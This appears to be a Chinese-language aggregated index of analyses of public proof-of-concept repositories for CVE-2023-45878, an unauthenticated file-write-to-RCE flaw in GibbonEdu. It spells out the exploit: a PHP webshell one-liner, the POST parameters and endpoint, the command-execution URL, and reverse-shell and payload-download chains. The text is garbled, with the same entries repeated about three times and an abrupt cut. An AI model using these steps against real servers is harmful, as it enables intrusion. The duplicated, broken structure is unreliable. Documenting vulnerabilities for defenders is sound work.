CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。由于 `rubrics_visualise_saveAjax.php` 接口未进行身份验证，攻击者可以利用此漏洞上传任意文件。攻击者通过构造包含 PHP 代码的图片文件，并利用 `img` 参数传递 base64 编码后的 payload，利用 `path` 参数指定文件保存路径，可以将恶意 PHP 文件写入服务器，最终实现远程代码执行。

**利用方式:**

1.  攻击者构造包含恶意 PHP 代码的图片，例如一个简单的 webshell：`<?php system($_REQUEST['cmd']); ?>`。
2.  将 PHP 代码进行 Base64 编码。
3.  构造 HTTP POST 请求，包含以下参数：
    *   `img`: 值为 `image/png;asdf,<base64编码的PHP代码>`
    *   `path`: 值为恶意 PHP 文件名，例如 `shell.php`
    *   `gibbonPersonID`: 任意值，例如 `0000000001`
4.  发送请求到 `http://<target>/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
5.  成功上传 webshell 后，可以通过访问 `http://<target>/Gibbon-LMS/shell.php?cmd=<command>` 执行任意命令。

**投毒风险分析:**

尽管该 POC 代码的主要功能是利用漏洞进行渗透测试，但仍存在潜在的投毒风险。
* 代码中包含请求目标地址的操作,如果作者在代码中加入隐藏的逻辑，例如将目标信息发送到恶意服务器，则可能导致信息泄露。
* 提供的 `powershell_reverse_shell` 函数用于生成 PowerShell 反弹 shell 的 payload，如果攻击者的服务器被攻陷，或者该函数被恶意修改，可能会导致反弹 shell 连接到恶意服务器，从而使受害者受到攻击。

总的来说，此仓库存在一定的投毒风险，但主要集中在作者是否在代码中加入了隐藏的恶意逻辑以及反弹shell的IP端口是否存在风险，评估结果为10%。用户在使用该 POC 代码时应仔细审查代码，确保其安全性。

**项目地址:** [davidzzo23/CVE-2023-45878](https://github.com/davidzzo23/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #5

**来源**: [CVE-2023-45878-dgoorden_CVE-2023-45878.md](../2023/CVE-2023-45878-dgoorden_CVE-2023-45878.md)

# CVE-2023-45878

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md](../2023/CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md)

## CVE-2023-45878-GibbonEdu-任意文件写入导致RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要能够访问存在漏洞的GibbonEdu实例，无需身份验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 存在于 GibbonEdu 25.0.1及更早版本中，是一个未经身份验证的任意文件写入漏洞。攻击者可以利用 `rubrics_visualise_saveAjax.phps` 接口，通过构造恶意的 `img` 和 `path` 参数，将任意PHP代码写入服务器的任意位置。漏洞利用的详细步骤如下：

1.  **漏洞原理：**`rubrics_visualise_saveAjax.phps` 文件存在漏洞，因为它允许未经身份验证的访问，并且不正确地处理 `img` (base64编码的图像) 和 `path` 参数。通过设置 `path` 参数，可以指定写入文件的目标目录，结合 `img` 参数可以写入任意内容。
2.  **利用方式：**
    *   攻击者首先构造一个包含恶意PHP代码的 `img` 参数，该代码将被base64编码。
    *   然后，攻击者通过POST请求将 `img` 参数和 `path` 参数发送到 `rubrics_visualise_saveAjax.php` 接口，`path` 参数指定写入文件的路径和文件名（例如 `gibbon_myconfig.php`）。
    *   服务器将base64解码后的 `img` 参数内容写入 `path` 参数指定的文件中，从而创建一个包含恶意PHP代码的webshell。
    *   攻击者可以通过访问创建的webshell，执行任意PHP代码，实现远程代码执行。
3.  **POC代码分析：** 提供的shell脚本 `CVE-2023-45878.sh` 自动化了漏洞利用过程：
    *   首先，使用 `msfvenom` 生成一个Windows平台的反向shell可执行文件。
    *   然后，通过 `curl` 命令向目标服务器发送POST请求，利用CVE-2023-45878漏洞写入webshell（`gibbon_myconfig.php`），该webshell允许执行任意命令。
    *   接着，脚本启动一个Python HTTP服务器，用于将反向shell可执行文件传输到目标系统。
    *   使用webshell下载反向shell可执行文件。
    *   最后，执行下载的反向shell，从而在攻击者和目标系统之间建立反向shell连接。
4.  **有效性：** 根据漏洞信息和POC代码分析，该POC代码是有效的，可以利用 CVE-2023-45878 漏洞实现未经身份验证的远程代码执行。
5. **投毒风险:** 该脚本的主要目的是演示和利用漏洞。其中存在投毒代码的可能性较低，但仍然存在一些潜在风险：
    *   `msfvenom`生成的反向shell本身可能被安全软件标记为恶意软件，但这属于正常情况，不是投毒。
    *   脚本中的curl命令，如果目标服务器存在其他漏洞，攻击者可以利用这些漏洞进行进一步的攻击。但这不是脚本本身投毒。
    *   脚本在生成payload的地方存在风险，如果作者修改了payload，可能会导致其他问题。 根据代码内容，投毒风险较低, 估计在10%。

**项目地址:** [0xyy66/CVE-2023-45878_to_RCE](https://github.com/0xyy66/CVE-2023-45878_to_RCE)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #2

**来源**: [CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md](../2023/CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md)

## CVE-2023-45878 - GibbonEdu Gibbon Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 目标系统运行GibbonEdu Gibbon，且攻击者可以访问rubrics_visualise_saveAjax.phps接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu Gibbon 25.0.1 及更早版本中。攻击者可以未经身份验证地利用 `rubrics_visualise_saveAjax.phps` 接口中的任意文件写入漏洞。该接口接受 `img`、`path` 和 `gibbonPersonID` 参数。`img` 参数应为 base64 编码的图像，而 `path` 参数用于指定目标文件夹。漏洞利用方式如下：

1.  攻击者构造一个包含恶意 PHP 代码的 `img` 参数，并将其进行 base64 编码。
2.  攻击者构造一个 `path` 参数，指定文件写入的路径，通常指向Web可访问的目录。
3.  攻击者向 `rubrics_visualise_saveAjax.phps` 接口发送包含恶意 `img` 和 `path` 参数的 POST 请求。
4.  服务器将 `img` 参数的内容进行 base64 解码，并将其写入 `path` 参数指定的文件中。
5.  攻击者可以通过访问写入的 PHP 文件来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞利用是有效的，因为 `rubrics_visualise_saveAjax.phps` 不需要身份验证，且允许写入任意文件。多个来源都证实了该漏洞的存在和利用方式。

**投毒风险：**

提供的漏洞利用代码 `/tmp/6b1d57c6d1772cd170f27ac4407e95a1/README.md`  只包含了一个README文件，内容仅为 CVE 编号。这本身不构成漏洞利用代码，更不包含任何恶意代码。风险评估主要是针对这个存储库中是否还存在其他隐藏的恶意内容。只包含README文件，没有实际的exp，投毒风险相对较低，但仍存在代码仓库作者在其他地方隐藏恶意代码的可能性，因此认为投毒风险为10%。

**利用方式：**

利用方式主要是通过构造恶意的POST请求，向`rubrics_visualise_saveAjax.phps`发送base64编码的PHP代码，并通过`path`参数指定写入路径，从而在服务器上写入恶意PHP文件，最终实现远程代码执行。

**项目地址:** [Can0I0Ever0Enter/CVE-2023-45878](https://github.com/Can0I0Ever0Enter/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #3

**来源**: [CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md](../2023/CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要未授权访问 rubrics_visualise_saveAjax.php 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。攻击者可以通过未授权访问 `rubrics_visualise_saveAjax.php` 页面，利用 `img` 和 `path` 参数实现任意文件写入。`img` 参数接收 base64 编码的图片数据，`path` 参数指定写入路径。由于该页面未进行身份验证，攻击者可以构造包含恶意 PHP 代码的图片，并将其写入到 Web 目录下，从而实现远程代码执行。

**有效性：**
根据漏洞描述和提供的 POC 代码，该漏洞利用的有效性较高。POC 代码通过构造包含 PHP 代码的 base64 编码图片，并利用 `rubrics_visualise_saveAjax.php` 页面写入该文件。搜索引擎结果也显示有可用的 Exploit 代码。

**投毒风险：**
分析 POC 代码内容，发现其功能主要是上传 webshell 和执行命令。代码存在开启 HTTP 服务，使用 PowerShell 下载执行脚本，以及启动 Netcat 监听等功能。 虽然这些功能本身是为了完成漏洞利用，但攻击者可以利用这些功能进行恶意活动。例如，可以修改 reverse shell 脚本，或者利用 HTTP 服务传播恶意软件。 代码中 powershell 加载的脚本存在一定风险，如果脚本源被劫持，可能被植入恶意代码。考虑到 HTTP 服务器和 PowerShell 脚本的潜在风险，这里将投毒风险评估为 10%。

**利用方式：**
1.  攻击者利用 `rubrics_visualise_saveAjax.php` 页面上传包含 PHP 代码的 webshell。
2.  攻击者通过访问 webshell 执行任意命令，例如下载并执行 PowerShell 脚本。
3.  PowerShell 脚本可以用于建立反向 shell 连接，从而控制受害者服务器。

**项目地址:** [PaulDHaes/CVE-2023-45878-POC](https://github.com/PaulDHaes/CVE-2023-45878-POC)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #4

**来源**: [CVE-2023-45878-davidzzo23_CVE-2023-45878.md](../2023/CVE-2023-45878-davidzzo23_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统存在未授权的 `rubrics_visualise_saveAjax.php` 接口，且目标系统可被网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。由于 `rubrics_visualise_saveAjax.php` 接口未进行身份验证，攻击者可以利用此漏洞上传任意文件。攻击者通过构造包含 PHP 代码的图片文件，并利用 `img` 参数传递 base64 编码后的 payload，利用 `path` 参数指定文件保存路径，可以将恶意 PHP 文件写入服务器，最终实现远程代码执行。

**利用方式:**

1.  攻击者构造包含恶意 PHP 代码的图片，例如一个简单的 webshell：`<?php system($_REQUEST['cmd']); ?>`。
2.  将 PHP 代码进行 Base64 编码。
3.  构造 HTTP POST 请求，包含以下参数：
    *   `img`: 值为 `image/png;asdf,<base64编码的PHP代码>`
    *   `path`: 值为恶意 PHP 文件名，例如 `shell.php`
    *   `gibbonPersonID`: 任意值，例如 `0000000001`
4.  发送请求到 `http://<target>/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
5.  成功上传 webshell 后，可以通过访问 `http://<target>/Gibbon-LMS/shell.php?cmd=<command>` 执行任意命令。

**投毒风险分析:**

尽管该 POC 代码的主要功能是利用漏洞进行渗透测试，但仍存在潜在的投毒风险。
* 代码中包含请求目标地址的操作,如果作者在代码中加入隐藏的逻辑，例如将目标信息发送到恶意服务器，则可能导致信息泄露。
* 提供的 `powershell_reverse_shell` 函数用于生成 PowerShell 反弹 shell 的 payload，如果攻击者的服务器被攻陷，或者该函数被恶意修改，可能会导致反弹 shell 连接到恶意服务器，从而使受害者受到攻击。

总的来说，此仓库存在一定的投毒风险，但主要集中在作者是否在代码中加入了隐藏的恶意逻辑以及反弹shell的IP端口是否存在风险，评估结果为10%。用户在使用该 POC 代码时应仔细审查代码，确保其安全性。

**项目地址:** [davidzzo23/CVE-2023-45878](https://github.com/davidzzo23/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #5

**来源**: [CVE-2023-45878-dgoorden_CVE-2023-45878.md](../2023/CVE-2023-45878-dgoorden_CVE-2023-45878.md)

# CVE-2023-45878

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md](../2023/CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md)

## CVE-2023-45878-GibbonEdu-任意文件写入导致RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要能够访问存在漏洞的GibbonEdu实例，无需身份验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 存在于 GibbonEdu 25.0.1及更早版本中，是一个未经身份验证的任意文件写入漏洞。攻击者可以利用 `rubrics_visualise_saveAjax.phps` 接口，通过构造恶意的 `img` 和 `path` 参数，将任意PHP代码写入服务器的任意位置。漏洞利用的详细步骤如下：

1.  **漏洞原理：**`rubrics_visualise_saveAjax.phps` 文件存在漏洞，因为它允许未经身份验证的访问，并且不正确地处理 `img` (base64编码的图像) 和 `path` 参数。通过设置 `path` 参数，可以指定写入文件的目标目录，结合 `img` 参数可以写入任意内容。
2.  **利用方式：**
    *   攻击者首先构造一个包含恶意PHP代码的 `img` 参数，该代码将被base64编码。
    *   然后，攻击者通过POST请求将 `img` 参数和 `path` 参数发送到 `rubrics_visualise_saveAjax.php` 接口，`path` 参数指定写入文件的路径和文件名（例如 `gibbon_myconfig.php`）。
    *   服务器将base64解码后的 `img` 参数内容写入 `path` 参数指定的文件中，从而创建一个包含恶意PHP代码的webshell。
    *   攻击者可以通过访问创建的webshell，执行任意PHP代码，实现远程代码执行。
3.  **POC代码分析：** 提供的shell脚本 `CVE-2023-45878.sh` 自动化了漏洞利用过程：
    *   首先，使用 `msfvenom` 生成一个Windows平台的反向shell可执行文件。
    *   然后，通过 `curl` 命令向目标服务器发送POST请求，利用CVE-2023-45878漏洞写入webshell（`gibbon_myconfig.php`），该webshell允许执行任意命令。
    *   接着，脚本启动一个Python HTTP服务器，用于将反向shell可执行文件传输到目标系统。
    *   使用webshell下载反向shell可执行文件。
    *   最后，执行下载的反向shell，从而在攻击者和目标系统之间建立反向shell连接。
4.  **有效性：** 根据漏洞信息和POC代码分析，该POC代码是有效的，可以利用 CVE-2023-45878 漏洞实现未经身份验证的远程代码执行。
5. **投毒风险:** 该脚本的主要目的是演示和利用漏洞。其中存在投毒代码的可能性较低，但仍然存在一些潜在风险：
    *   `msfvenom`生成的反向shell本身可能被安全软件标记为恶意软件，但这属于正常情况，不是投毒。
    *   脚本中的curl命令，如果目标服务器存在其他漏洞，攻击者可以利用这些漏洞进行进一步的攻击。但这不是脚本本身投毒。
    *   脚本在生成payload的地方存在风险，如果作者修改了payload，可能会导致其他问题。 根据代码内容，投毒风险较低, 估计在10%。

**项目地址:** [0xyy66/CVE-2023-45878_to_RCE](https://github.com/0xyy66/CVE-2023-45878_to_RCE)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #2

**来源**: [CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md](../2023/CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md)

## CVE-2023-45878 - GibbonEdu Gibbon Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 目标系统运行GibbonEdu Gibbon，且攻击者可以访问rubrics_visualise_saveAjax.phps接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu Gibbon 25.0.1 及更早版本中。攻击者可以未经身份验证地利用 `rubrics_visualise_saveAjax.phps` 接口中的任意文件写入漏洞。该接口接受 `img`、`path` 和 `gibbonPersonID` 参数。`img` 参数应为 base64 编码的图像，而 `path` 参数用于指定目标文件夹。漏洞利用方式如下：

1.  攻击者构造一个包含恶意 PHP 代码的 `img` 参数，并将其进行 base64 编码。
2.  攻击者构造一个 `path` 参数，指定文件写入的路径，通常指向Web可访问的目录。
3.  攻击者向 `rubrics_visualise_saveAjax.phps` 接口发送包含恶意 `img` 和 `path` 参数的 POST 请求。
4.  服务器将 `img` 参数的内容进行 base64 解码，并将其写入 `path` 参数指定的文件中。
5.  攻击者可以通过访问写入的 PHP 文件来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞利用是有效的，因为 `rubrics_visualise_saveAjax.phps` 不需要身份验证，且允许写入任意文件。多个来源都证实了该漏洞的存在和利用方式。

**投毒风险：**

提供的漏洞利用代码 `/tmp/6b1d57c6d1772cd170f27ac4407e95a1/README.md`  只包含了一个README文件，内容仅为 CVE 编号。这本身不构成漏洞利用代码，更不包含任何恶意代码。风险评估主要是针对这个存储库中是否还存在其他隐藏的恶意内容。只包含README文件，没有实际的exp，投毒风险相对较低，但仍存在代码仓库作者在其他地方隐藏恶意代码的可能性，因此认为投毒风险为10%。

**利用方式：**

利用方式主要是通过构造恶意的POST请求，向`rubrics_visualise_saveAjax.phps`发送base64编码的PHP代码，并通过`path`参数指定写入路径，从而在服务器上写入恶意PHP文件，最终实现远程代码执行。

**项目地址:** [Can0I0Ever0Enter/CVE-2023-45878](https://github.com/Can0I0Ever0Enter/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #3

**来源**: [CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md](../2023/CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要未授权访问 rubrics_visualise_saveAjax.php 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。攻击者可以通过未授权访问 `rubrics_visualise_saveAjax.php` 页面，利用 `img` 和 `path` 参数实现任意文件写入。`img` 参数接收 base64 编码的图片数据，`path` 参数指定写入路径。由于该页面未进行身份验证，攻击者可以构造包含恶意 PHP 代码的图片，并将其写入到 Web 目录下，从而实现远程代码执行。

**有效性：**
根据漏洞描述和提供的 POC 代码，该漏洞利用的有效性较高。POC 代码通过构造包含 PHP 代码的 base64 编码图片，并利用 `rubrics_visualise_saveAjax.php` 页面写入该文件。搜索引擎结果也显示有可用的 Exploit 代码。

**投毒风险：**
分析 POC 代码内容，发现其功能主要是上传 webshell 和执行命令。代码存在开启 HTTP 服务，使用 PowerShell 下载执行脚本，以及启动 Netcat 监听等功能。 虽然这些功能本身是为了完成漏洞利用，但攻击者可以利用这些功能进行恶意活动。例如，可以修改 reverse shell 脚本，或者利用 HTTP 服务传播恶意软件。 代码中 powershell 加载的脚本存在一定风险，如果脚本源被劫持，可能被植入恶意代码。考虑到 HTTP 服务器和 PowerShell 脚本的潜在风险，这里将投毒风险评估为 10%。

**利用方式：**
1.  攻击者利用 `rubrics_visualise_saveAjax.php` 页面上传包含 PHP 代码的 webshell。
2.  攻击者通过访问 webshell 执行任意命令，例如下载并执行 PowerShell 脚本。
3.  PowerShell 脚本可以用于建立反向 shell 连接，从而控制受害者服务器。

**项目地址:** [PaulDHaes/CVE-2023-45878-POC](https://github.com/PaulDHaes/CVE-2023-45878-POC)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #4

**来源**: [CVE-2023-45878-davidzzo23_CVE-2023-45878.md](../2023/CVE-2023-45878-davidzzo23_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统存在未授权的 `rubrics_visualise_saveAjax.php` 接口，且目标系统可被网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。由于 `rubrics_visualise_saveAjax.php` 接口未进行身份验证，攻击者可以利用此漏洞上传任意文件。攻击者通过构造包含 PHP 代码的图片文件，并利用 `img` 参数传递 base64 编码后的 payload，利用 `path` 参数指定文件保存路径，可以将恶意 PHP 文件写入服务器，最终实现远程代码执行。

**利用方式:**

1.  攻击者构造包含恶意 PHP 代码的图片，例如一个简单的 webshell：`<?php system($_REQUEST['cmd']); ?>`。
2.  将 PHP 代码进行 Base64 编码。
3.  构造 HTTP POST 请求，包含以下参数：
    *   `img`: 值为 `image/png;asdf,<base64编码的PHP代码>`
    *   `path`: 值为恶意 PHP 文件名，例如 `shell.php`
    *   `gibbonPersonID`: 任意值，例如 `0000000001`
4.  发送请求到 `http://<target>/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
5.  成功上传 webshell 后，可以通过访问 `http://<target>/Gibbon-LMS/shell.php?cmd=<command>` 执行任意命令。

**投毒风险分析:**

尽管该 POC 代码的主要功能是利用漏洞进行渗透测试，但仍存在潜在的投毒风险。
* 代码中包含请求目标地址的操作,如果作者在代码中加入隐藏的逻辑，例如将目标信息发送到恶意服务器，则可能导致信息泄露。
* 提供的 `powershell_reverse_shell` 函数用于生成 PowerShell 反弹 shell 的 payload，如果攻击者的服务器被攻陷，或者该函数被恶意修改，可能会导致反弹 shell 连接到恶意服务器，从而使受害者受到攻击。

总的来说，此仓库存在一定的投毒风险，但主要集中在作者是否在代码中加入了隐藏的恶意逻辑以及反弹shell的IP端口是否存在风险，评估结果为10%。用户在使用该 POC 代码时应仔细审查代码，确保其安全性。

**项目地址:** [davidzzo23/CVE-2023-45878](https://github.com/davidzzo23/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #5

**来源**: [CVE-2023-45878-dgoorden_CVE-2023-45878.md](../2023/CVE-2023-45878-dgoorden_CVE-2023-45878.md)

# CVE-2023-45878

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md](../2023/CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md)

## CVE-2023-45878-GibbonEdu-任意文件写入导致RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要能够访问存在漏洞的GibbonEdu实例，无需身份验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 存在于 GibbonEdu 25.0.1及更早版本中，是一个未经身份验证的任意文件写入漏洞。攻击者可以利用 `rubrics_visualise_saveAjax.phps` 接口，通过构造恶意的 `img` 和 `path` 参数，将任意PHP代码写入服务器的任意位置。漏洞利用的详细步骤如下：

1.  **漏洞原理：**`rubrics_visualise_saveAjax.phps` 文件存在漏洞，因为它允许未经身份验证的访问，并且不正确地处理 `img` (base64编码的图像) 和 `path` 参数。通过设置 `path` 参数，可以指定写入文件的目标目录，结合 `img` 参数可以写入任意内容。
2.  **利用方式：**
    *   攻击者首先构造一个包含恶意PHP代码的 `img` 参数，该代码将被base64编码。
    *   然后，攻击者通过POST请求将 `img` 参数和 `path` 参数发送到 `rubrics_visualise_saveAjax.php` 接口，`path` 参数指定写入文件的路径和文件名（例如 `gibbon_myconfig.php`）。
    *   服务器将base64解码后的 `img` 参数内容写入 `path` 参数指定的文件中，从而创建一个包含恶意PHP代码的webshell。
    *   攻击者可以通过访问创建的webshell，执行任意PHP代码，实现远程代码执行。
3.  **POC代码分析：** 提供的shell脚本 `CVE-2023-45878.sh` 自动化了漏洞利用过程：
    *   首先，使用 `msfvenom` 生成一个Windows平台的反向shell可执行文件。
    *   然后，通过 `curl` 命令向目标服务器发送POST请求，利用CVE-2023-45878漏洞写入webshell（`gibbon_myconfig.php`），该webshell允许执行任意命令。
    *   接着，脚本启动一个Python HTTP服务器，用于将反向shell可执行文件传输到目标系统。
    *   使用webshell下载反向shell可执行文件。
    *   最后，执行下载的反向shell，从而在攻击者和目标系统之间建立反向shell连接。
4.  **有效性：** 根据漏洞信息和POC代码分析，该POC代码是有效的，可以利用 CVE-2023-45878 漏洞实现未经身份验证的远程代码执行。
5. **投毒风险:** 该脚本的主要目的是演示和利用漏洞。其中存在投毒代码的可能性较低，但仍然存在一些潜在风险：
    *   `msfvenom`生成的反向shell本身可能被安全软件标记为恶意软件，但这属于正常情况，不是投毒。
    *   脚本中的curl命令，如果目标服务器存在其他漏洞，攻击者可以利用这些漏洞进行进一步的攻击。但这不是脚本本身投毒。
    *   脚本在生成payload的地方存在风险，如果作者修改了payload，可能会导致其他问题。 根据代码内容，投毒风险较低, 估计在10%。

**项目地址:** [0xyy66/CVE-2023-45878_to_RCE](https://github.com/0xyy66/CVE-2023-45878_to_RCE)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #2

**来源**: [CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md](../2023/CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md)

## CVE-2023-45878 - GibbonEdu Gibbon Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 目标系统运行GibbonEdu Gibbon，且攻击者可以访问rubrics_visualise_saveAjax.phps接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu Gibbon 25.0.1 及更早版本中。攻击者可以未经身份验证地利用 `rubrics_visualise_saveAjax.phps` 接口中的任意文件写入漏洞。该接口接受 `img`、`path` 和 `gibbonPersonID` 参数。`img` 参数应为 base64 编码的图像，而 `path` 参数用于指定目标文件夹。漏洞利用方式如下：

1.  攻击者构造一个包含恶意 PHP 代码的 `img` 参数，并将其进行 base64 编码。
2.  攻击者构造一个 `path` 参数，指定文件写入的路径，通常指向Web可访问的目录。
3.  攻击者向 `rubrics_visualise_saveAjax.phps` 接口发送包含恶意 `img` 和 `path` 参数的 POST 请求。
4.  服务器将 `img` 参数的内容进行 base64 解码，并将其写入 `path` 参数指定的文件中。
5.  攻击者可以通过访问写入的 PHP 文件来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞利用是有效的，因为 `rubrics_visualise_saveAjax.phps` 不需要身份验证，且允许写入任意文件。多个来源都证实了该漏洞的存在和利用方式。

**投毒风险：**

提供的漏洞利用代码 `/tmp/6b1d57c6d1772cd170f27ac4407e95a1/README.md`  只包含了一个README文件，内容仅为 CVE 编号。这本身不构成漏洞利用代码，更不包含任何恶意代码。风险评估主要是针对这个存储库中是否还存在其他隐藏的恶意内容。只包含README文件，没有实际的exp，投毒风险相对较低，但仍存在代码仓库作者在其他地方隐藏恶意代码的可能性，因此认为投毒风险为10%。

**利用方式：**

利用方式主要是通过构造恶意的POST请求，向`rubrics_visualise_saveAjax.phps`发送base64编码的PHP代码，并通过`path`参数指定写入路径，从而在服务器上写入恶意PHP文件，最终实现远程代码执行。

**项目地址:** [Can0I0Ever0Enter/CVE-2023-45878](https://github.com/Can0I0Ever0Enter/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #3

**来源**: [CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md](../2023/CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要未授权访问 rubrics_visualise_saveAjax.php 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。攻击者可以通过未授权访问 `rubrics_visualise_saveAjax.php` 页面，利用 `img` 和 `path` 参数实现任意文件写入。`img` 参数接收 base64 编码的图片数据，`path` 参数指定写入路径。由于该页面未进行身份验证，攻击者可以构造包含恶意 PHP 代码的图片，并将其写入到 Web 目录下，从而实现远程代码执行。

**有效性：**
根据漏洞描述和提供的 POC 代码，该漏洞利用的有效性较高。POC 代码通过构造包含 PHP 代码的 base64 编码图片，并利用 `rubrics_visualise_saveAjax.php` 页面写入该文件。搜索引擎结果也显示有可用的 Exploit 代码。

**投毒风险：**
分析 POC 代码内容，发现其功能主要是上传 webshell 和执行命令。代码存在开启 HTTP 服务，使用 PowerShell 下载执行脚本，以及启动 Netcat 监听等功能。 虽然这些功能本身是为了完成漏洞利用，但攻击者可以利用这些功能进行恶意活动。例如，可以修改 reverse shell 脚本，或者利用 HTTP 服务传播恶意软件。 代码中 powershell 加载的脚本存在一定风险，如果脚本源被劫持，可能被植入恶意代码。考虑到 HTTP 服务器和 PowerShell 脚本的潜在风险，这里将投毒风险评估为 10%。

**利用方式：**
